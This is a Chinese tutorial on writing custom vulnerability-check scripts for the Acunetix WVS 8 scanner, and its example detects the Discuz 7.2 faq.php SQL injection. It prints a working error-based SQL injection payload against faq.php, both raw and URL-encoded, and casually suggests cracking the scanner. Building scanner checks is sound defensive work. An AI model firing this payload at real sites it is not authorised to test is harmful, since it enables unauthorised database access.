# 编写自己的Acunetix WVS漏洞脚本

0x00 背景
-------

* * *

AWVS提供了自定义的脚本编程接口，可是网上的资料很少，只有官方的几篇介绍和参考手册，最近研究了一下怎么编写AWVS的漏洞脚本来写一篇简单性的文章，大家有兴趣的可以交流。

本文以8.0为例，首先呢安装好Acunetix Web Vulnerability Scanner 8（该破解的破解，该付费的付费），然后我们需要WVS公开的小小的SDK，下载地址：[http://www.acunetix.com/download/tools/WVSSDK.zip](http://www.acunetix.com/download/tools/WVSSDK.zip)，下载好了后解压bin目录下的WVSS.exe到WVS安装目录下面，此即为WVS脚本编写工具。另外sdk里还有3个简单的脚本小例子和WVS_SDK_Quick_Introduction.pdf，耐心的可以看看。

0x01 细节
-------

* * *

下面的截图就是WVS码脚本工具了

![2014070400041767163.jpg](http://drops.javaweb.org/uploads/images/c375362ea30f654015fa9f9d2639094ec6a50615.jpg)

打开WVS数据目录，通常是在**C:\Documents and Settings\All Users\Application Data\Acunetix WVS 8\Data\Scripts**下，可以看到有10个文件夹，Network、PerFile、PerScheme、PostScan、PerFolder、PerServer、PostCrawl、WebApps、XML。我们先来认识一下：

![2014070400050052332.jpg](http://drops.javaweb.org/uploads/images/1ce16079a822d7c9f80a2d8ba3b9eb8ece7552d1.jpg)

```
Network：此目录下的脚本文件是当扫描器完成了端口扫描模块后执行，这些脚本可以检测TCP端口的开放情况，比如检测FTP的21端口是否开放、是否允许匿名登录； 
PerFile：此目录下的脚本是当扫描器爬虫爬到文件后执行，比如你可以检查当前测试文件是否存在备份文件，当前测试文件的内容等； 
PerFolder：此目录下的脚本是当扫描器爬虫爬行到目录后执行，比如你可以检测当前测试目录是否存在列目录漏洞等； 
PerScheme：此目录下的脚本会对每个URL的 GET、POST结构的参数进行检测，AWVS定义了的参数包括HTTP头、Cookies、GET/POST参数、文件上传(multipart/form-data)……比如你可以检测XSS、SQL注入和其他的应用程序测试； 
PerServer：此目录下的脚本只在扫描开始是执行一次，比如你可以检测Web服务器中间件类型； 
PostScan：此目录下的脚本只在扫描结束后执行一次，比如你可以检测存储型XSS、存储型SQL注入、存储型文件包含、存储型目录遍历、存储型代码执行、存储型文件篡改、存储型php代码执行等； 
XML：漏洞的详细描述文档都在这里。 

```

今天演示的漏洞是Discuz 7.2的faq.php SQL注入，关于漏洞：[http://ha.cker.in/1087.seo](http://ha.cker.in/1087.seo)

我们就用POC来写漏洞的脚本吧！

检测原理：

根据公开的POC构造出特殊请求，若存在SQL注入则构造的SQL语句将会执行成功并在返回到响应内容，构造POC如下：

```
/faq.php?action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat((select 0x4861636B656442795365636572),floor(rand(0)*2))x from information_schema.tables group by x)a)%23

```

URLEncode编码一下：

```
faq.php?action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(),concat((select%200x4861636B656442795365636572),floor(rand(0)2))x%20from%20information_schema%20.tables%20group%20by%20x)a)%23

```

![2014070400052637340.jpg](http://drops.javaweb.org/uploads/images/a801637d8bb23de6bc52d82c523fbfaa07547343.jpg)

我们需要用WVS的脚本请求此URL并处理返回的内容，以此判断是否存在漏洞。

打开AWVS，Tools -> Vulnerability Editor，右键VulnXMLs节点，选择‘Add Vulnerability’

![2014070400061580159.jpg](http://drops.javaweb.org/uploads/images/b0ac2b98d46f8efa30063d8b999fc15097ee9412.jpg)

新建一个漏洞，VulnXML FILENAME为**Discuz7.2FaqSqlinjection**，点Add按钮（新建的VulnXML会被保存到XML文件夹下哦）

![2014070400063761671.jpg](http://drops.javaweb.org/uploads/images/2c3530bdb01eea6d6227d0d71cc8fc51b22217de.jpg)

接下来登记下该漏洞的相关信息

![2014070400072634459.jpg](http://drops.javaweb.org/uploads/images/3aae389383131b78a74ecfedefe6a4d4c9572696.jpg)

![2014070400073990780.jpg](http://drops.javaweb.org/uploads/images/49953f5295c6f8113db7bc86810bf21952de34dc.jpg)

然后进入wvss写脚本，保存为Discuz7.2FaqSqlinjection.script放入PerServer文件夹吧。

测试脚本：

使用AWVS的网站爬虫爬行网站并保存结果，

![2014070400081569530.jpg](http://drops.javaweb.org/uploads/images/a142a4a443e592919e8eb9d93af161b0de5bce47.jpg)

这里选择根目录

![2014070400083732484.jpg](http://drops.javaweb.org/uploads/images/cb94008e5ae382ae2678c00313bad22e5de607f4.jpg)

点击小三角按钮测试

![2014070400091625586.jpg](http://drops.javaweb.org/uploads/images/582fa68f4ed1473c264d36edeaa5b965586b1126.jpg)

![2014070400092981770.jpg](http://drops.javaweb.org/uploads/images/a750896a9b698a5299668fd579aaf7494c1b844b.jpg)

完整的代码如下

![2014070400095916620.jpg](http://drops.javaweb.org/uploads/images/b3cad89b8b1981187eb1396a4510ebce7bd59bf1.jpg)

测试成功了，我到WVS里扫描去测试扫描看看~

我们新建的漏洞脚本在这里，Scanning Profiles –》 PerFolder目录下，新建一个扫描模板勾选要测试的脚本并保存，这里保存为“test_HA.CKER.IN”，然后用这个模板扫描目标站测试吧

![2014070400102959221.jpg](http://drops.javaweb.org/uploads/images/7643d4facee66e0f3e3272790f520ef5f9a20e47.jpg)

选择模板并开始扫描

![2014070400105090725.jpg](http://drops.javaweb.org/uploads/images/eded56d37a1f0570de794ced914871bafe4d8c7e.jpg)

扫描完成后，结果如图

![2014070400112465943.jpg](http://drops.javaweb.org/uploads/images/50dd3340983e5cc1797a236d38bbff8000909468.jpg)

漏洞脚本重复检测了很多次，下次更新修复下这个问题。

0x02 总结
-------

* * *

本人不才，这次对AWVS自定义脚本编写简单的介绍就到这了，只是做个示例展示给大家，这些API不是很详细我也不是很会写，更多的API等你去挖掘吧！

参考：

[http://www.acunetix.com/vulnerability-scanner/scriptingreference/index.html](http://www.acunetix.com/vulnerability-scanner/scriptingreference/index.html)

[http://www.acunetix.com/blog/docs/creating-custom-checks-acunetix-web-vulnerability-scanner/](http://www.acunetix.com/blog/docs/creating-custom-checks-acunetix-web-vulnerability-scanner/)